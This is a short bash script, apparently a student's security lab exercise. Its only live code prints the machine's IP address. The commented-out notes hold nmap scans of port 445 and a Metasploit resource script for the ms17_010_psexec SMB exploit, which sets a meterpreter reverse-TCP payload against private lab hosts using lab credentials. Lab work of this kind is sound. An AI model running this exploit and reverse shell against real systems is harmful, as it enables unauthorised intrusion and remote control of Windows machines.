#!/bin/bash
#  John Williams
#  105201054
#  Date: Sat. Sep. 29, 2018
#  Program: meta.sh


#ipaddress is skimmed off of webpage

ipaddr=`ip addr | grep eth0 | grep inet |  awk '{print $2}' | awk -F '/'  '{print $1}'` 
echo $ipaddr
#https://www.youtube.com/watch?v=tFoXTeABfHE


#msfconsole -r ms17_010_psexec 











#echo "192.168.33.130"
#nmap -sV -p 445 $1
#nmap -sV -p 445 192.168.33.132
#https://metasploit.help.rapid7.com/docs/resource-scripts

# generate resource file inorder to parse it

#rm -f  ms17_010_psexec
#
#echo "use exploit/windows/smb/ms17_010_psexec
#set payload windows/meterpreter/reverse_tcp
#set LHOST 192.168.33.129
#set LPORT 4444
#set RHOST 192.168.33.132
#set SMBuser student
#set SMBpass Student123
#exploit
#" >> ms17_010_psexec
#
#use exploit/windows/smb/ms17_010_psexec
#set payload windows/meterpreter/reverse_tcp
#set LHOST 192.168.33.129
#set LPORT 4444
#set RHOST 192.168.33.132
#set SMBuser student
#set SMBpass Student123
#exploit
#
# BUILD FILE: 

#help 
#
#Resource Script Commands
#========================
#
#    Command       Description
#    -------       -----------
#
#    makerc        Save commands entered since start to a file
#
#    resource      Run the commands stored in a file
#



#commands for the metasploit 
#exploit/windows/smb/ms17_010_psexec
#info
#options

#use exploit/windows/smb/ms17_010_psexec
#set payload windows/meterpreter/reverse_tcp
#set LHOST 192.168.33.129
#set LPORT 4444
#set RHOST 192.168.33.130
#set SMBuser student
#set SMBpass Student123








